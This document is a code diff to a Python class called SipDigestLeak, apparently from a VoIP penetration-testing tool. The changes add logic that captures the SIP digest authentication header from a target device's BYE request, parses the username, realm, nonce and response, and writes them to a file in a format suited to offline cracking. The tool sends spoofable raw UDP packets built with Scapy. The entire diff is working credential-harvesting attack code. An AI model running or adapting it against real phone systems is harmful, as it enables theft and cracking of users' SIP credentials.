@@ -59,7 +59,7 @@ class SipDigestLeak:
         self.user = ""
         self.pwd = ""
         self.auth_mode = "www"
-        self.sdp = 0
+        self.sdp = 1
         self.sdes = 0
         self.verbose = 0
         self.file = "iplist.txt"
@@ -899,6 +899,7 @@ class SipDigestLeak:
         sniff_thread.daemon = True
         sniff_thread.start()
         
+        print(f"source_ip: {source_ip}, target_ip: {target_ip}, lport: {lport}, target_port: {target_port}")
         packet = IP(src=source_ip, dst=target_ip) / \
                 UDP(sport=lport, dport=target_port) / \
                 Raw(load=msg)
@@ -1242,41 +1243,101 @@ class SipDigestLeak:
                             cseq = int(headers["cseq"])
                             via = headers["via2"]
                             
-                            print(f"{self.c.YELLOW}[=>] Request 407 Proxy Authentication Required")
-                            
-                            msg = create_response_error(
-                                "407 Proxy Authentication Required",
-                                self.from_user,
-                                self.to_user,
-                                self.proto,
-                                self.domain,
-                                self.lport,
-                                cseq,
-                                "BYE",
-                                branch,
-                                self.callid,
-                                self.from_tag,
-                                headers["totag"],
-                                self.localip,
-                                via,
-                                self.auth_mode,
-                            )
-                            
-                            packet = IP(src=self.spoof_ip if self.spoof_ip else self.localip, 
-                                      dst=self.ip) / \
-                                    UDP(sport=int(self.lport), dport=int(self.rport)) / \
-                                    Raw(load=msg)
-                            send(packet, verbose=0)
-                            
-                            if self.verbose == 1:
-                                print(
-                                    f"{self.c.BWHITE}[+] Sending 407 to {self.ip}:{self.rport}/UDP ..."
+                            # 判断header里有没有auth字段
+                            if "auth" in headers and headers["auth"]:
+                                try:
+                                    auth = headers["auth"]
+                                    if auth != "":
+                                        print(f"{self.c.BGREEN}Auth={auth}\n{self.c.WHITE}")
+                                        line = "%s###%d###%s###%s" % (self.ip, int(self.rport), self.proto, auth)
+                                        self.found.append(line)
+                                        
+                                        digest_headers = parse_digest(auth)
+                                        if self.ofile != "":
+                                            data = '%s"%s"%s"%s"BYE"%s"%s"%s"%s"%s"MD5"%s' % (
+                                                self.ip,
+                                                self.localip,
+                                                digest_headers["username"],
+                                                digest_headers["realm"],
+                                                digest_headers["uri"],
+                                                digest_headers["nonce"],
+                                                digest_headers["cnonce"],
+                                                digest_headers["nc"],
+                                                digest_headers["qop"],
+                                                digest_headers["response"],
+                                            )
+                                                                            
+                                            with open(self.ofile, "a+") as f:
+                                                f.write(data)
+                                                f.write("\n")
+                                            
+                                            print(f"{self.c.WHITE}Auth data saved in file {self.ofile}")
+                                            
+                                            print(f"{self.c.YELLOW}[=>] Request 200 OK")
+                                            msg = create_response_ok(
+                                                self.from_user,
+                                                self.to_user,
+                                                self.proto,
+                                                self.domain,
+                                                self.lport,
+                                                int(headers["cseq"]),
+                                                branch,
+                                                self.callid,
+                                                self.from_tag,
+                                                headers["totag"],
+                                            )
+                                            
+                                            packet = IP(src=self.spoof_ip if self.spoof_ip else self.localip, 
+                                                    dst=self.ip) / \
+                                                    UDP(sport=int(self.lport), dport=int(self.rport)) / \
+                                                    Raw(load=msg)
+                                            send(packet, verbose=0)
+                                            
+                                            if self.verbose == 1:
+                                                print(
+                                                    f"{self.c.BWHITE}[+] Sending 200 OK to {self.ip}:{self.rport}/UDP ..."
+                                                )
+                                                print(f"{self.c.YELLOW}{msg}{self.c.WHITE}")
+                                            self.stop_sniffing = True
+                                    else:
+                                        print(f"{self.c.BRED}No Auth Digest received in first BYE\n{self.c.WHITE}")
+                                except:
+                                    print(f"{self.c.BRED}No Auth Digest received in first BYE(\n{self.c.WHITE}")
+                                    
+                            else:
+                                print(f"{self.c.YELLOW}[=>] Request 407 Proxy Authentication Required")
+                                
+                                msg = create_response_error(
+                                    "407 Proxy Authentication Required",
+                                    self.from_user,
+                                    self.to_user,
+                                    self.proto,
+                                    self.domain,
+                                    self.lport,
+                                    cseq,
+                                    "BYE",
+                                    branch,
+                                    self.callid,
+                                    self.from_tag,
+                                    headers["totag"],
+                                    self.localip,
+                                    via,
+                                    self.auth_mode,
                                 )
-                                print(f"{self.c.YELLOW}{msg}{self.c.WHITE}")
-                            
-                            self.waiting_for_auth_bye = True
-                        
-                        
+                                
+                                packet = IP(src=self.spoof_ip if self.spoof_ip else self.localip, 
+                                        dst=self.ip) / \
+                                        UDP(sport=int(self.lport), dport=int(self.rport)) / \
+                                        Raw(load=msg)
+                                send(packet, verbose=0)
+                                
+                                if self.verbose == 1:
+                                    print(
+                                        f"{self.c.BWHITE}[+] Sending 407 to {self.ip}:{self.rport}/UDP ..."
+                                    )
+                                    print(f"{self.c.YELLOW}{msg}{self.c.WHITE}")
+                                
+                                self.waiting_for_auth_bye = True   
                 except Exception as e:
                     print(f"{self.c.RED}[!] Error processing packet: {str(e)}{self.c.WHITE}")
                     pass
